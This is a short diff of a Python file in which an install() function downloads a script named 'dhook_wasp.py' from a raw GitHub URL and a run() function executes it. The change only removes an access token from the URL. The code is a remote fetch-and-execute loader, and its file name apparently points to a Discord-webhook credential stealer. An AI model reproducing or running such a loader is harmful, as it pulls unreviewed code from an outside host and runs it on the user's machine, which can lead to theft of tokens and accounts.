@@ -29,7 +29,7 @@ def getName():
 
 def install(path):
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(request.urlopen("https://raw.githubusercontent.com/t0karev404/tes/main/dhook_wasp.py?token=GHSAT0AAAAAACAIABWWCFZQE6UDUTPVNKR6ZEVWYTA").read().decode("utf8"))
+        f.write(request.urlopen("https://raw.githubusercontent.com/t0karev404/tes/main/dhook_wasp.py").read().decode("utf8"))
 
 def run(path):
     system(f"start {executable} {path}")
